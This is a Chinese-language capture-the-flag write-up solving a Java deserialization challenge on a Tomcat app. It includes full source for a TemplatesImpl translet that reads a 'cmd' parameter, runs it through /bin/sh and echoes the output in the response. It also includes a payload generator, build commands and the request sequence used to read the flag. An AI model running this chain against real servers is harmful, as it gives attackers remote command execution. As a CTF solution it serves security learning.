# 附加挑战

## 题目简述

附加挑战沿用第二十三章的 `/dogs/import` Java 反序列化入口和 `Dog.hashCode()` 反射 gadget，但不再依赖出网反弹。利用 `Dog.wagTail()` 调用 `TemplatesImpl.newTransformer()`，可让 `TemplatesImpl` 从 `_bytecodes` 动态定义一个继承 `AbstractTranslet` 的类。恶意类在静态初始化块中取得当前 Tomcat 请求与响应，把命令输出直接写回 HTTP 响应。

完整调用链为：

```text
POST /dogs/import
  -> ObjectInputStream.readObject()
  -> HashMap.readObject()
  -> Dog.hashCode()
  -> Dog.wagTail(TemplatesImpl, "newTransformer", ...)
  -> TemplatesImpl.newTransformer()
  -> defineTransletClasses()
  -> 恶意 AbstractTranslet 子类的静态初始化块
```

## 解题过程

### 构造 Tomcat ThreadLocal 回显类

Tomcat 的 `ApplicationFilterChain` 带有 `lastServicedRequest` 和 `lastServicedResponse` 两个静态 ThreadLocal，但只有 `ApplicationDispatcher.WRAP_SAME_OBJECT` 开启时才会在请求开始阶段填入当前对象。第一次触发先把开关设为 `true` 并初始化两个 ThreadLocal；第二次触发时，请求链已经把当前 request/response 放入其中，静态代码便能取得 `cmd` 参数并回显执行结果。

```java
// EchoTranslet.java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;

public class EchoTranslet extends AbstractTranslet {
    private static void makeWritable(Field field) throws Exception {
        Field modifiers = Field.class.getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        field.setAccessible(true);
        modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
    }

    static {
        try {
            Class<?> dispatcher = Class.forName(
                    "org.apache.catalina.core.ApplicationDispatcher");
            Field wrap = dispatcher.getDeclaredField("WRAP_SAME_OBJECT");
            Field requestField = ApplicationFilterChain.class
                    .getDeclaredField("lastServicedRequest");
            Field responseField = ApplicationFilterChain.class
                    .getDeclaredField("lastServicedResponse");

            makeWritable(wrap);
            makeWritable(requestField);
            makeWritable(responseField);

            wrap.setBoolean(null, true);

            if (requestField.get(null) == null) {
                requestField.set(null, new ThreadLocal<ServletRequest>());
            }
            if (responseField.get(null) == null) {
                responseField.set(null, new ThreadLocal<ServletResponse>());
            }

            @SuppressWarnings("unchecked")
            ThreadLocal<ServletRequest> requestHolder =
                    (ThreadLocal<ServletRequest>) requestField.get(null);
            @SuppressWarnings("unchecked")
            ThreadLocal<ServletResponse> responseHolder =
                    (ThreadLocal<ServletResponse>) responseField.get(null);

            ServletRequest request = requestHolder.get();
            ServletResponse response = responseHolder.get();

            if (request != null && response != null) {
                String command = request.getParameter("cmd");
                if (command != null && !command.trim().isEmpty()) {
                    Process process = new ProcessBuilder(
                            "/bin/sh", "-c", command)
                            .redirectErrorStream(true)
                            .start();

                    PrintWriter writer = response.getWriter();
                    try (InputStream input = process.getInputStream()) {
                        byte[] buffer = new byte[4096];
                        int length;
                        while ((length = input.read(buffer)) != -1) {
                            writer.write(new String(
                                    buffer, 0, length, StandardCharsets.UTF_8));
                        }
                    }
                    writer.flush();
                }
            }
        } catch (Throwable error) {
            error.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler)
            throws TransletException {
    }
}
```

题目运行在 JDK 8；该版本既能访问这些 JDK 内部 Xalan 类，也保留了通过 `Field.modifiers` 修改 `final` 字段的行为。应使用 JDK 8 编译，以免产生目标 JVM 无法加载的高版本 class 文件。

### 把字节码装入 TemplatesImpl

载荷生成器读取上一步得到的 `EchoTranslet.class`，填入 `TemplatesImpl._bytecodes`。与第二十三章相同，先让 `Dog` 以无害的 `String.length()` 完成 `HashMap.put()`，再把它的反射字段改为危险调用，避免生成载荷时本机提前执行 `newTransformer()`。

```java
// Exp.java
import com.example.demo.Dog.Dog;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exp {
    private static void setField(Object target, String name, Object value)
            throws ReflectiveOperationException {
        Field field = target.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(target, value);
    }

    private static void configureDog(Dog dog, Object object, String method,
                                     Class<?>[] types, Object[] arguments)
            throws ReflectiveOperationException {
        setField(dog, "object", object);
        setField(dog, "methodName", method);
        setField(dog, "paramTypes", types);
        setField(dog, "args", arguments);
    }

    private static String serialize(Object object) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ObjectOutputStream output = new ObjectOutputStream(buffer)) {
            output.writeObject(object);
        }
        return Base64.getEncoder().encodeToString(buffer.toByteArray());
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            throw new IllegalArgumentException(
                    "usage: java Exp EchoTranslet.class");
        }

        byte[] bytecode = Files.readAllBytes(Paths.get(args[0]));

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][]{bytecode});
        setField(templates, "_name", "EchoTranslet");
        setField(templates, "_tfactory", new TransformerFactoryImpl());

        Dog trigger = new Dog(1, "dog", "dog", 1);
        configureDog(
                trigger,
                "seed",
                "length",
                new Class<?>[0],
                new Object[0]
        );

        Map<Object, Object> outer = new HashMap<>();
        outer.put(trigger, "value");

        configureDog(
                trigger,
                templates,
                "newTransformer",
                new Class<?>[0],
                new Object[0]
        );

        System.out.println(serialize(outer));
    }
}
```

编译时需要从 `demo.jar` 中取出题目类及 `BOOT-INF/lib` 下的 Tomcat/Servlet 依赖。下面给出 JDK 8 环境中的一组完整命令：

```sh
mkdir build && cd build
jar -xf ../demo.jar BOOT-INF/classes BOOT-INF/lib

LIBS=$(find BOOT-INF/lib -name '*.jar' -print | paste -sd: -)
javac -source 8 -target 8 -cp "$LIBS" -d . ../EchoTranslet.java
javac -source 8 -target 8 -cp "BOOT-INF/classes" -d . ../Exp.java

java -cp ".:BOOT-INF/classes" Exp EchoTranslet.class > payload.txt
```

### 两次触发并读取 flag

把 `payload.txt` 中的 Base64 作为表单字段 `data` 提交到 `/dogs/import`：

1. 第一次提交用于打开 `WRAP_SAME_OBJECT` 并初始化 ThreadLocal，此时通常没有直接回显。
2. 第二次提交同一载荷，并在查询参数中加入 `cmd=printenv FLAG`。新的 `TemplatesImpl` 类加载器会再次定义并初始化 `EchoTranslet`，此时 ThreadLocal 已持有当前 request/response，响应中即可出现 flag。

第二次请求的逻辑形式如下；实际发送时要对 Base64 表单值和查询参数做 URL 编码：

```text
POST /dogs/import?cmd=printenv%20FLAG
Content-Type: application/x-www-form-urlencoded

data=<Base64 载荷>
```

该附加版本的 Dockerfile 直接以 `java -jar demo.jar` 启动，没有把 flag 写入固定文件，也没有清除环境变量，所以 `printenv FLAG` 与实际部署方式相符。

## 方法总结

本题把自定义反射 gadget 与经典 `TemplatesImpl` 动态类加载连接起来，再用 Tomcat 请求线程中的对象解决无回显问题。关键细节有三个：类型转换发生在 `readObject()` 之后，无法阻止 gadget；恶意类必须继承 `AbstractTranslet`；ThreadLocal 回显需要先开启开关、再在下一次请求中读取当前对象。相比注册长期驻留的拦截器，一次性回显链足以完成题目，也更容易复现和审计。
